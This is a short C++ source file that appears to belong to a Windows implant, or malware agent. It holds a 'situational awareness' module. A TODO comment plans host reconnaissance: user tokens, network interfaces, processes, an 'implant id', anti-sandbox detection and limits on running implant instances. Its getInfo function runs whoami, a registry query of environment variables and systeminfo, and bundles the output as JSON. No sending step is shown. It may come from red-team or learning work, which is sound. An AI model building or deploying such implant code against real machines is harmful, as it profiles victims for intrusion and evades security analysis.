/*
Situational Awareness TODO list:
* read environment variables
* list the computer's network interfaces
  * collect MAC, IP, interface names
* get Windows version
* get current username and token
* get computer's name
* get the machine's GUID (generate computer_guid aka implant id)
* list files in a directory (?)
* change directory (?)
* list all running processes
* bonus: anti sandbox detection
* limit the number of running implant instances to 3

*/

#include <string>
#include "../libs/nlohmann/json.hpp"
#include "../execution/execution.hpp"
#include "sitawareness.hpp"

using json = nlohmann::json;


std::string getInfo() {
  json j;
  std::string result;

  // i think this covers most of it?
  j["whoami"] = runProgram("whoami");
  //j["ps"] = runProgram("ps");
  j["env"] = runProgram("reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment\"");
  j["systeminfo"] = runProgram("systeminfo");

  result = j.dump(4);

  return result;

}